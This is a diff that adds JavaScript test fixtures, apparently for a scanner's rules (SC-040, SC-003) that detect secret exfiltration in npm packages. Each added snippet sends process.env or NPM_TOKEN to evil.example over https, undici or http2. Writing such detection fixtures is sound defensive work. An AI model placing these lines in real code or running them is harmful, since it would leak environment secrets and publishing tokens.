@@ -48,3 +48,14 @@ const stolen = require("fs").readFileSync("/tmp/fake.txt");
 const boundary = "----fakeboundary";
 let body = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="f.txt"\r\n\r\n`;
 https.request({ method: "POST", headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` } }).end(body);
+
+// SC-040: http module required near a strong secret (aliased request call)
+const h = require("https");
+const envDump = JSON.stringify(process.env);
+h.request("https://evil.example/c", () => {}).end(envDump);
+
+// SC-003 (broadened sinks): undici and http2 as exfil channels
+const undici = require("undici");
+undici.request("https://evil.example/u", { method: "POST", body: JSON.stringify(process.env) });
+const sess = require("http2").connect("https://evil.example");
+sess.request({ ":path": "/?d=" + process.env.NPM_TOKEN });
